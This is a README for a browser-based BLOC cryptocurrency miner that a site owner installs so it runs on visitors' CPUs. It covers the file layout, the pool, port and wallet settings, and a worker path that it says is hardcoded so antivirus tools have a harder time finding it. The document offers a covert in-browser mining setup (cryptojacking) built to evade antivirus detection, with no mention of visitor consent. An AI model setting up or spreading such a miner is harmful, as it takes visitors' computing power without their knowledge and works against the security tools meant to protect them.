# BLOC-javascript-miner

With this miner, you can mine [BLOC](https://bloc.money/) coins using your visitors CPU power. It will mine directly in browser.  

### Files available in this script

- **m.js** - the actual miner that handles [javascript workers](https://www.w3schools.com/html/html5_webworkers.asp) and [websockets connections](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
- **worker.js** - the worker receives a job and calculates the hash
- **cn.js** - the actual [webasm](https://webassembly.org/) mining algorithm
- **test_with_output.html** - html file that outputs some mining stats (this will start the whole mining process)
- **test_minimal.html** - html file with minimal setup (no mining output stats)

### How to set it up

Copy all the files on a domain and change the following:

```javascript
var mining_pool = 'bloc-mining.eu'; // mining pool domain
```

this is the mining pool domain. we recommend leaving it untouched.

```javascript
var mining_port = '4444'; // mining pool port
```

this is the mining pool port (for CPU mining). we recommend leaving it untouched.

```javascript
var mining_wallet = 'abLoc5jeufY8yWkZgjDJnP6DuuhyGE3jb5F6kmKKqqynhbUDgfvvC2FjdP5DjjnoW2R9aecMDETTbdMuFNFzHRWvGNkzHGKHMT9'; // your wallet address
```

this is the wallet where the coins will be sent by the mining pool.

Edit m.js file and go to the line where you find  

```javascript
var newWorker = new Worker("https://bloc-mining.com/assets/frontpanel/js/newminer/worker.js?_=" + Math.random().toString());
```

the `https://bloc-mining.com/assets/frontpanel/js/newminer/worker.js` is the path to `worker.js` file from the `js` folder. Make sure you use the absolute path, like it is here.  
The reason it's hardcoded, is to be harder for antiviruses to find it.  

### How to run it

Simply navigate to `test_minimal.html` and you will start mining.

### Notes

- To mine, choose one of the .html files `test_with_output.html` or `test_minimal.html`. Do not use them both!
- All .js files must be in the same folder, otherwise you need to change the paths youself